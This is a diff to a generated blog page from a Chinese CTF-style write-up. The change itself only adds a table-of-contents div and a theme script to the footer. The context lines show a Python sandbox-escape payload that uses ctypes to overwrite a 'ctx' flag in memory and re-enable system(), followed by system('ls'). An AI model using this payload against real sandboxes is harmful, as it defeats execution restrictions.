@@ -63,7 +63,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LOCALFUNCS = &#123;<span class="string">'open'</span>: _open, <span class="string">'type'</span>: _type, <span class="string">'ctx'</span>:<span class="number">1</span>&#125;</span><br></pre></td></tr></table></figure>
 <p>攻击方法基本确认，通过ctypes修改ctx的值从而进行覆盖，恢复system函数的作用，payload如下:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cc=c_int.from_address(id(ctx)+(sizeof(c_long) + sizeof(c_voidp)));cc.value=<span class="number">0</span></span><br><span class="line">system(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>
-</article><div id="paginator"></div></div></div><div id="footer"><div id="bottom-inner"><span>Powerd By </span><span> Meizj </span><span>using    </span><a href="https://github.com/meizjm3i/Meizj"><span>Meizj</span></a><span>.</span><br></div></div><script src="/js/prettify.js"></script><script>//- $(window).on('load', function(){ 
+</article><div id="paginator"></div><div id="toc"></div></div></div><div id="footer"><div id="bottom-inner"><span>Powerd By </span><span> Meizj </span><span>using    </span><a href="https://github.com/meizjm3i/Meizj"><span>Meizj</span></a><span>.</span><br></div></div><script src="/js/prettify.js"></script><script src="/js/meizj.js"></script><script>//- $(window).on('load', function(){ 
 $('pre').addClass('prettyprint linenums');
 prettyPrint();
 //- });
